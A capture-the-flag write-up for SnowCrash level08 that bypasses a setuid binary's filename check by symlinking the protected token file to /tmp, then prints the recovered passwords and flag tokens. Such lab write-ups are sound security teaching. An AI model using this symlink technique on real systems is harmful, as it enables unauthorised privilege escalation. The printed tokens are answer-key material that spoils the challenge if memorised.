# level08

Using `ls`, we can discover new binary and file.

```bash
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

Let's try to get more information about our couple of files.

```bash
level08@SnowCrash:~$ readelf -p .rodata ./level08

String dump of section '.rodata':
  [     8]  %s [file to read]^J
  [    1b]  token
  [    21]  You may not access '%s'^J
  [    3a]  Unable to open %s
  [    4c]  Unable to read fd %d

level08@SnowCrash:~$ cat token 
cat: token: Permission denied
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Ok, we can see that we have a potential attack vector on the file to read. Let's get more informations about the call stack before using gbd.

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff6f4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                             = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)         = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ 
```

Ok, so we cannot access the program is the file having `token` as filename.

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
ln: failed to create symbolic link `/tmp/flag': File exists
level08@SnowCrash:~$ rm /tmp/flag
rm: remove write-protected regular file `/tmp/flag'? y
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

Perfect, let's head to level09.

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password: 25749xKZ8L7DkSCwJkT9dyv6f
level09@SnowCrash:~$
```
